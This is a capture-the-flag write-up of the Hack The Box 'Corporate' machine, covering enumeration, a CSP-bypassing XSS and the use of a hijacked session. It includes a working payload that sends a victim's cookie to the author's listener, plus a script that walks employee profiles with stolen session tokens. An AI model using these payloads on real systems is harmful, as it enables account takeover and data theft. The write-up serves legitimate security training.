---
layout: writeup
category: HTB
description: Corporate is an Insane linux machines featuring a lot of interesting exploitation techniques. First, we have to bypass Content Security Policy rules in order to exploit a XSS vulnerability by abusing a js file in corporate.htb that can execute arbitrary functions. Once we have the cookie of a staff user, we can abuse a IDOR vulnerability to share ourselfs (in reality other users we have cookie hijacked) all files other users have. In one of these files there is a document for the new Corporate users that advice how is the default password format. We will create a python script that test this password format through all the users and we will see that four users use this default password format. In the web, there's nothing useful to do with this credentials, but since they share a vpn to connect to the internal resources, we can connect to a vm of the machine with the same user and password. In one of the user's home directory, there is a .mozilla directory with interesting data for bitwarden password manager extension that we can use to bruteforce the pin that would led us to gitea credential that will leak a jwt token. With this jwt token, we can forge a cookie to change a password for a user that belongs to a interesting group that will gives us access to a docker socket (this is possible because the vm uses LDAP authentication to manage the users as the web and if we change the password in the web, we also change the password in the linux machine). Since this user have access to the docker socket, we can create a docker container with a mount of / and have access as root in this proxmox environment. To escape the container, a SSH key of sysadmin will be used since we have access as root in the container and we can access as any user. Finally, to escalate as root, we can abuse PVE api to change password of root and in consequence, have access.
points: 50
solves: 479
tags: xss bypass-csp cookie-hijacking idor vpn password-spraying .mozilla-enumeration bruteforce-bitwarden-pin source-code-analysis cookie-forging jwt docker-privesc abupve
date: 2024-07-15
title: HTB Corporate writeup
comments: false
---

# Enumeration

## Port scanning

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.246
# Nmap 7.94SVN scan initiated Thu Jun 27 22:10:15 2024 as: nmap -sSVC -p- --open --min-rate 5000 -v -n -Pn -oN corporateTCP 10.10.11.246
Nmap scan report for 10.10.11.246
Host is up (0.034s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    OpenResty web app server 1.21.4.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://corporate.htb
|_http-server-header: openresty/1.21.4.3

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 27 22:10:53 2024 -- 1 IP address (1 host up) scanned in 38.00 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

Since we only see a web running on port 80, let's jump into it.

## Web enumeration
            
The web redirects to corporate.htb:

```bash
❯ curl -v 10.10.11.246
```
![Redirect to corporate.htb](/assets/images/Corporate/redirect-to-corporate-htb.png)

So its needed to add it to the `/etc/hosts`:

```bash
❯ echo '10.10.11.246 corporate.htb' | sudo tee -a /etc/hosts
10.10.11.246 corporate.htb
```

Looking at the web, it seems like a static page talking about a agency:

![corporate.htb main page](/assets/images/Corporate/corporate.htb-main.png)

And it has a contact form that redirects to support.corporate.htb:

![corporate.htb contact form](/assets/images/Corporate/contact-form.png)
![contact redirects to support.corporate.htb](/assets/images/Corporate/contact-form-redirect-to-support.corporate.htb.png)

After adding it to the `/etc/hosts`, it's possible to chat with an agent and also is HTML injectable (I used `<h1>test</h1>`):

![support.corporate.htb](/assets/images/Corporate/support-chat.png)

But we can't just inject our script because it has the directive `script-src self` in Content-Security-Policy response header, which says that the web can only execute scripts of the self web (support.corporate.htb):

```bash
❯ curl -v -s support.corporate.htb
* Host support.corporate.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.246
*   Trying 10.10.11.246:80...
* Connected to support.corporate.htb (10.10.11.246) port 80
> GET / HTTP/1.1
> Host: support.corporate.htb
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Mon, 15 Jul 2024 18:30:45 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 1725
< Connection: keep-alive
< ETag: W/"6bd-8ktIu9fKNl5w9xUHWMatLAOK6yo"
< Content-Security-Policy: base-uri 'self'; default-src 'self' http://corporate.htb http://*.corporate.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://maps.googleapis.com https://maps.gstatic.com; font-src 'self' https://fonts.googleapis.com/ https://fonts.gstatic.com data:; img-src 'self' data: maps.gstatic.com; frame-src https://www.google.com/maps/; object-src 'none'; script-src 'self'
< X-Content-Type-Options: nosniff
< X-XSS-Options: 1; mode=block
< X-Frame-Options: DENY
<..SNIP..>
```

Before going deeper into this, I will enumerate subdomains in order to see if there is something useful:

```bash
❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -H "Host: FUZZ.corporate.htb" -u http://corporate.htb -fs 175

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://corporate.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.corporate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 175
________________________________________________

support                 [Status: 200, Size: 1725, Words: 383, Lines: 39, Duration: 209ms]
git                     [Status: 403, Size: 159, Words: 3, Lines: 8, Duration: 188ms]
sso                     [Status: 302, Size: 38, Words: 4, Lines: 1, Duration: 197ms]
people                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 195ms]
:: Progress: [4989/4989] :: Job [1/1] :: 216 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

We have three new subdomains (we already had support). I will add them to the /etc/hosts.

### git.corporate.htb

We can't access it, and enumerating routes doesn't led to nothing useful:

![git.corporate.htb forbidden 403](/assets/images/Corporate/git.corporate.htb-forbidden.png)

**common.txt wordlist**:
```bash
❯ ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt  -mc all -u http://git.corporate.htb/FUZZ -fs 159

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://git.corporate.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 159
________________________________________________

:: Progress: [4727/4727] :: Job [1/1] :: 214 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
```
**directory-list-2.3-medium.txt wordlist**
```bash
❯ ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -mc all -u http://git.corporate.htb/FUZZ -fs 159 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://git.corporate.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response size: 159
________________________________________________

:: Progress: [220545/220545] :: Job [1/1] :: 541 req/sec :: Duration: [0:07:19] :: Errors: 0 ::
```

### sso.corporate.htb

It's just a login form which isn't vulnerable to nothing because I have tested for it and no results:

![sso.corporate.htb](/assets/images/Corporate/sso.corporate.htb.png)

There's also nothing useful in the server routes, only `services` that has a link that redirects to people.corporate.htb and another that redirect to /reset-password that itself redirects to /login so we can't do anything useful:

```bash
❯ ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://sso.corporate.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sso.corporate.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

Login                   [Status: 200, Size: 1010, Words: 179, Lines: 38, Duration: 188ms]
Services                [Status: 200, Size: 1444, Words: 282, Lines: 62, Duration: 189ms]
login                   [Status: 200, Size: 1010, Words: 179, Lines: 38, Duration: 188ms]
logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 186ms]
services                [Status: 200, Size: 1444, Words: 282, Lines: 62, Duration: 192ms]
static                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 189ms]
:: Progress: [4727/4727] :: Job [1/1] :: 212 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```
```bash
❯ ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 100 -u http://sso.corporate.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sso.corporate.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 1010, Words: 179, Lines: 38, Duration: 201ms]
services                [Status: 200, Size: 1444, Words: 282, Lines: 62, Duration: 208ms]
static                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 203ms]
logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 192ms]
                        [Status: 302, Size: 38, Words: 4, Lines: 1, Duration: 189ms]
:: Progress: [207629/207629] :: Job [1/1] :: 491 req/sec :: Duration: [0:07:02] :: Errors: 0 ::
```
> Note: I used directory-list-lowercase-2.3-medium.txt because I saw that the routes are case insensitive

### people.corporate.htb

It's needed to login to see the content available and it isn't vulnerable because I have tested it before with no results:

![people.corporate.htb](/assets/images/Corporate/people.corporate.htb.png)

The login button redirects to sso.corporate.htb login that we saw before:

![people.corporate.htb login redirects to sso.corporate.htb/login](/assets/images/Corporate/people.corporate.htb-login-redirects-to-sso.corporate.htb.png)

There are bunch of routes here, so it's interesting. However, almost all redirect to /auth/login. Route / redirects to /dashboard that redirects to /auth/login. Route /static is for js and css files used in the web:

```bash
❯ ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -v -u http://people.corporate.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://people.corporate.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 192ms]
| URL | http://people.corporate.htb/news
| --> | /auth/login
    * FUZZ: news

[Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 193ms]
| URL | http://people.corporate.htb/calendar
| --> | /auth/login
    * FUZZ: calendar

[Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 192ms]
| URL | http://people.corporate.htb/static
| --> | /static/
    * FUZZ: static

[Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 189ms]
| URL | http://people.corporate.htb/chat
| --> | /auth/login
    * FUZZ: chat

[Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 187ms]
| URL | http://people.corporate.htb/holidays
| --> | /auth/login
    * FUZZ: holidays

[Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 190ms]
| URL | http://people.corporate.htb/dashboard
| --> | /auth/login
    * FUZZ: dashboard

[Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 186ms]
| URL | http://people.corporate.htb/sharing
| --> | /auth/login
    * FUZZ: sharing

[Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 222ms]
| URL | http://people.corporate.htb/employee
| --> | /auth/login
    * FUZZ: employee

[Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 239ms]
| URL | http://people.corporate.htb/payroll
| --> | /auth/login
    * FUZZ: payroll

[Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 1020ms]
| URL | http://people.corporate.htb/
| --> | /dashboard
    * FUZZ: 

:: Progress: [207629/207629] :: Job [1/1] :: 266 req/sec :: Duration: [0:14:15] :: Errors: 0 ::
```

### back to corporate.htb

Going back to corporate.htb, the 404 page reflects the value of the route passed:

![404 page reflects in corporate.htb](/assets/images/Corporate/404-corporate.htb-reflects.png)

And a HTML injection also works:

![HTML injection in 404 page](/assets/images/Corporate/html-injection-corporate.htb.png)

Since here there also are Content-Security-Policy directives implemented, we neither can't inject simple script tags and execute what we want, we have to use a script of the same page. A interesting one is /assets/js/analytics.min.js that is used with a ?v parameter in the source code of the main page and its value is reflected in the script:

![corporate.htb scripts](/assets/images/Corporate/corporate.htb-scripts.png)
![v parameter reflected in analytics.min.js script](/assets/images/Corporate/v-parameter-reflected-on-analytics.min.js.png)

That function executes javascript code, so we can test for it to execute `alert(1)`. However, there is an error in the console that says _analytics variable doesn't exist:

![analytics not defined](/assets/images/Corporate/analytics-not-defined.png)

But it exists, so it's probably on another script:

![analytics exists](/assets/images/Corporate/analytics-exist.png)

That script is /vendor/analytics.min.js:

![analytics in script](/assets/images/Corporate/analytics-in-script.png)

As _analytics is defined in another script (/vendor/analytics.min.js), we have to import it first to successfully execute the alert in the XSS:

![XSS successfully executed (alert)](/assets/images/Corporate/alert-successfully-executed.png)

#### exploitation path

Since we have found a way to execute javascript code in a url and we have HTML injection in the chat, a nice way to send us the agent cookie (if flag HttpOnly is false) is to insert a `<meta>` tag that redirects to the xss url and send to our http server the cookie:

> payload: ```<meta http-equiv="refresh" content="0; url='http://corporate.htb/<script src=%22/vendor/analytics.min.js%22></script><script src=%22/assets/js/analytics.min.js?v=document.location=`http://10.10.14.133/?c=${document.cookie}`%22>'">```

To make it realistic as it was a real attack, I will write to my own index.html to redirect to support.corporate.htb so the victim doesn't see nothing strange. I will do this since it redirects to my own server and the victim can see his cookie in the url. Remember to start the http server with python:

```bash
❯ mkdir web-server
❯ cd web-server
❯ echo "<meta http-equiv=\"refresh\" content='0; url=\"http://support.corporate.htb\"'>" > index.html
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now sending the payload to the chat, we receive a JWT cookie and there is no suspicious activity in the victim side:

![JWT cookie received](/assets/images/Corporate/jwt-cookie-received.png)

# Access as elwin.jones

Since the subdomain that more functionality have is people.corporate.htb, I will put the cookie there and I have access to a panel as Hermina Leuschke (in your case can be different because the agents in the support page are selected randomly):

![dashboard access as Hermina Leuschke](/assets/images/Corporate/people.corporate.htb-dashboard-Hermina-Leuschke.png)

A thing to take into account is that in the profile I can see my email, birthday, roles and I can edit it:

![profile](/assets/images/Corporate/profile.png)

In the chat, we have links for other users whose url is `/employee/<ID>`, where I can see the same info as in my profile but for other users:

![chat corporate](/assets/images/Corporate/chat-corporate.png)
![user url corporate](/assets/images/Corporate/user-url-corporate.png)

I will use this script to enumerate all the users and print each corresponding roles:

```python
#!/usr/bin/python3
import requests, pdb, re

employee_url = "http://people.corporate.htb/employee"

def main():
    cookies = {'session':'eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=', 'session.sig':'mtDfpaW-l4_4iOtBEWziyOjD83g', 'CorporateSSO':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MCwibmFtZSI6Ikhlcm1pbmEiLCJzdXJuYW1lIjoiTGV1c2Noa2UiLCJlbWFpbCI6Ikhlcm1pbmEuTGV1c2Noa2VAY29ycG9yYXRlLmh0YiIsInJvbGVzIjpbInNhbGVzIl0sInJlcXVpcmVDdXJyZW50UGFzc3dvcmQiOnRydWUsImlhdCI6MTcyMTIzMzA2NiwiZXhwIjoxNzIxMzE5NDY2fQ.xPr-CmiK5wepRjKnE3VXFNzmrQ_oIGZFswoQvE9Q8Zg'}
    for id in range(5001, 7001):
        r = requests.get(f"{employee_url}/{id}", cookies=cookies)
        roles = re.findall('<tr>\n          <th scope="row">Roles</th>\n          <td>(.*)</td>\n', r.text)
        email = re.findall('<a href="mailto:(.*?)">.*?</a>', r.text)
        if email[0] != "hermina.leuschke@corporate.htb":
            print(email[0] + ": ", end="", flush=True)
            print(roles[0])
        else:
            break
        

if __name__ == '__main__':
    main()
```

```bash
❯ python3 enum-users-web.py > users-with-roles.txt
```

We have a list of a lot of users with each roles:

```bash
❯ cat users-with-roles.txt
ward.pfannerstill@corporate.htb: Engineer
oleta.gutmann@corporate.htb: Hr
kian.rodriguez@corporate.htb: Engineer
jacey.bernhard@corporate.htb: Consultant
veda.kemmer@corporate.htb: Hr
raphael.adams@corporate.htb: Finance
stevie.rosenbaum@corporate.htb: Sysadmin
halle.keeling@corporate.htb: Finance
ross.leffler@corporate.htb: Consultant
marcella.kihn@corporate.htb: Consultant
joy.gorczany@corporate.htb: Hr
larissa.wilkinson@corporate.htb: Hr
skye.will@corporate.htb: Hr
gideon.daugherty@corporate.htb: Engineer
amie.torphy@corporate.htb: Sysadmin
katelyn.swift@corporate.htb: Consultant
lila.mcglynn@corporate.htb: Consultant
estelle.padberg@corporate.htb: It
kacey.krajcik@corporate.htb: Hr
tanner.kuvalis@corporate.htb: It
elwin.jones@corporate.htb: It
anastasia.nader@corporate.htb: It
morris.lowe@corporate.htb: It
leanne.runolfsdottir@corporate.htb: Consultant
gayle.graham@corporate.htb: Engineer
dylan.schumm@corporate.htb: Engineer
richie.cormier@corporate.htb: Engineer
marge.frami@corporate.htb: Engineer
erna.lindgren@corporate.htb: Finance
callie.goldner@corporate.htb: Hr
uriel.hahn@corporate.htb: Hr
ally.effertz@corporate.htb: Finance
annamarie.flatley@corporate.htb: Hr
candido.mcdermott@corporate.htb: Hr
scarlett.herzog@corporate.htb: Consultant
estrella.wisoky@corporate.htb: Finance
adrianna.stehr@corporate.htb: Consultant
abbigail.halvorson@corporate.htb: Engineer
august.gottlieb@corporate.htb: It
harley.ratke@corporate.htb: Finance
laurie.casper@corporate.htb: Consultant
arch.ryan@corporate.htb: Engineer
dayne.ruecker@corporate.htb: It
abigayle.kessler@corporate.htb: Finance
katelin.keeling@corporate.htb: Consultant
penelope.mcclure@corporate.htb: Hr
rachelle.langworth@corporate.htb: Consultant
america.kirlin@corporate.htb: Consultant
garland.denesik@corporate.htb: Consultant
cathryn.weissnat@corporate.htb: Engineer
elwin.mills@corporate.htb: It
beth.feest@corporate.htb: It
mohammed.feeney@corporate.htb: Finance
bethel.hessel@corporate.htb: Consultant
nya.little@corporate.htb: Consultant
kasey.walsh@corporate.htb: Consultant
stephen.schamberger@corporate.htb: It
dessie.wolf@corporate.htb: It
mabel.koepp@corporate.htb: Consultant
christian.spencer@corporate.htb: Hr
esperanza.kihn@corporate.htb: Finance
justyn.beahan@corporate.htb: Consultant
josephine.hermann@corporate.htb: Hr
sadie.greenfelder@corporate.htb: Finance
zaria.kozey@corporate.htb: Hr
antwan.bernhard@corporate.htb: Consultant
hector.king@corporate.htb: It
brody.wiza@corporate.htb: Consultant
jammie.corkery@corporate.htb: Sales
```

And with this command I can see the unique existing roles:

```bash
❯ cat users-with-roles.txt| awk '{print $2}' FS=': ' | sort -u
Consultant
Engineer
Finance
Hr
It
Sales
Sysadmin
```

We have definitely this users that belong to each group:

```plaintext
* Consultant: jacey.bernhard@corporate.htb,ross.leffler@corporate.htb,marcella.kihn@corporate.htb,katelyn.swift@corporate.htb,lila.mcglynn@corporate.htb,leanne.runolfsdottir@corporate.htb,scarlett.herzog@corporate.htb,adrianna.stehr@corporate.htb,laurie.casper@corporate.htb,katelin.keeling@corporate.htb,rachelle.langworth@corporate.htb,america.kirlin@corporate.htb,garland.denesik@corporate.htb,bethel.hessel@corporate.htb,nya.little@corporate.htb,kasey.walsh@corporate.htb,mabel.koepp@corporate.htb,justyn.beahan@corporate.htb,antwan.bernhard@corporate.htb,brody.wiza@corporate.htb,
* Engineer: ward.pfannerstill@corporate.htb,kian.rodriguez@corporate.htb,gideon.daugherty@corporate.htb,gayle.graham@corporate.htb,dylan.schumm@corporate.htb,richie.cormier@corporate.htb,marge.frami@corporate.htb,abbigail.halvorson@corporate.htb,arch.ryan@corporate.htb,cathryn.weissnat@corporate.htb,
* Finance: raphael.adams@corporate.htb,halle.keeling@corporate.htb,erna.lindgren@corporate.htb,ally.effertz@corporate.htb,estrella.wisoky@corporate.htb,harley.ratke@corporate.htb,abigayle.kessler@corporate.htb,mohammed.feeney@corporate.htb,esperanza.kihn@corporate.htb,sadie.greenfelder@corporate.htb,
* Hr: oleta.gutmann@corporate.htb,veda.kemmer@corporate.htb,joy.gorczany@corporate.htb,larissa.wilkinson@corporate.htb,skye.will@corporate.htb,kacey.krajcik@corporate.htb,callie.goldner@corporate.htb,uriel.hahn@corporate.htb,annamarie.flatley@corporate.htb,candido.mcdermott@corporate.htb,penelope.mcclure@corporate.htb,christian.spencer@corporate.htb,josephine.hermann@corporate.htb,zaria.kozey@corporate.htb,
* It: estelle.padberg@corporate.htb,tanner.kuvalis@corporate.htb,elwin.jones@corporate.htb,anastasia.nader@corporate.htb,morris.lowe@corporate.htb,august.gottlieb@corporate.htb,dayne.ruecker@corporate.htb,elwin.mills@corporate.htb,beth.feest@corporate.htb,stephen.schamberger@corporate.htb,dessie.wolf@corporate.htb,hector.king@corporate.htb,
* Sales: hermina.leuschke@corporate.htb,jammie.corkery@corporate.htb,
* Sysadmin: stevie.rosenbaum@corporate.htb,amie.torphy@corporate.htb,
```

> Note: command I used to retrieve that: `❯ for role in Consultant Engineer Finance Hr It Sales Sysadmin; do echo -n "* $role: "; catn users-with-roles.txt | grep $role | awk '{print $1}' FS=': ' | tr '\n' ', '; echo; done`

Among the functionalities, the only interesting one is sharing, where I can see Hermina Leuschke files and share with somebody:

![files functionality](/assets/images/Corporate/files-functionality-dashboard.png)
![sharing files functionality](/assets/images/Corporate/sharing-functionality-dashboard.png)

The most interesting files here is the .ovpn file that connect to the target machine on udp on port 1194:

![vpn on port 1194 udp](/assets/images/Corporate/ovpn-connect.png)

Downloading it and connecting, I can see that it adds the route 10.9.0.0/24 via 10.8.0.1:

```bash
❯ sudo openvpn hermina-leuschke.ovpn
```
![added routes for IPs vpn](/assets/images/Corporate/added-routes-vpn.png)

I will map the network with this simple bash oneliner that goes through a loop from 1 to 255 (range of IPs valid here) and test for this hosts using ping, and if the command exited successfully (that's why using the && operand), it will echo that the host is active. It's possible to see that 10.9.0.1 is active (which is the route IP) and 10.9.0.4:

```bash
❯ for i in $(seq 1 255);do timeout 1 bash -c "ping -c 1 10.9.0.$i" &>/dev/null && echo "Host 10.9.0.$i is active";done;wait
Host 10.9.0.1 is active
Host 10.9.0.4 is active
```

Scanning ports return this:

```bash
❯ sudo nmap -sSVC -p- --open --min-rate 5000 -v -n -Pn 10.9.0.4 10.9.0.1
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 18:08 CEST
<..SNIP..>
Nmap scan report for 10.9.0.4
Host is up (0.18s latency).
Not shown: 64511 closed tcp ports (reset), 1022 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2f:b1:d4:7c:ac:3a:2c:b1:ee:ee:6f:7f:df:41:29:c3 (ECDSA)
|_  256 f0:25:8e:11:26:bd:f3:78:65:59:32:c3:55:7e:99:e5 (ED25519)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.9.0.1
Host is up (0.18s latency).
Not shown: 64590 closed tcp ports (reset), 937 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 4f:7c:4a:20:ca:0c:61:3b:4a:b5:67:f6:3c:36:f7:90 (RSA)
|   256 cc:05:3a:28:c0:18:fa:52:c5:f7:b9:28:c9:ce:09:31 (ECDSA)
|_  256 e8:37:e6:93:6d:eb:d7:74:e4:83:e9:54:4d:e6:95:88 (ED25519)
80/tcp   open  http           OpenResty web app server 1.21.4.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Did not follow redirect to http://corporate.htb
|_http-server-header: openresty/1.21.4.3
389/tcp  open  ldap           OpenLDAP 2.2.X - 2.3.X
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ldap.corporate.htb
| Subject Alternative Name: DNS:ldap.corporate.htb
| Issuer: commonName=ldap.corporate.htb
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-04-04T14:37:34
| Not valid after:  2033-04-01T14:37:35
| MD5:   e4af:a65b:b06b:e957:d427:b75e:6bca:94ac
|_SHA-1: 90ba:45cb:1dbb:5c40:4a08:d0dc:15a4:b9ba:f917:7de4
636/tcp  open  ssl/ldap       OpenLDAP 2.2.X - 2.3.X
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ldap.corporate.htb
| Subject Alternative Name: DNS:ldap.corporate.htb
| Issuer: commonName=ldap.corporate.htb
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-04-04T14:37:34
| Not valid after:  2033-04-01T14:37:35
| MD5:   e4af:a65b:b06b:e957:d427:b75e:6bca:94ac
|_SHA-1: 90ba:45cb:1dbb:5c40:4a08:d0dc:15a4:b9ba:f917:7de4
2049/tcp open  nfs            4 (RPC #100003)
3004/tcp open  csoftragent?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 303 See Other
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Location: /explore
|     Set-Cookie: i_like_gitea=b2252d30ef18e987; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=9PXfopEWWIx79q6Ipg_QqYZqsls6MTcyMTMxODQ5NzY5MTg3MTE1Ng; Path=/; Expires=Fri, 19 Jul 2024 16:01:37 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 18 Jul 2024 16:01:37 GMT
|     Content-Length: 35
|     href="/explore">See Other</a>.
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=98df98072193808a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=sClOjLhv29whVZLwK0N9iSGvgf06MTcyMTMxODQ5ODA1OTM1NDcyNA; Path=/; Expires=Fri, 19 Jul 2024 16:01:38 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
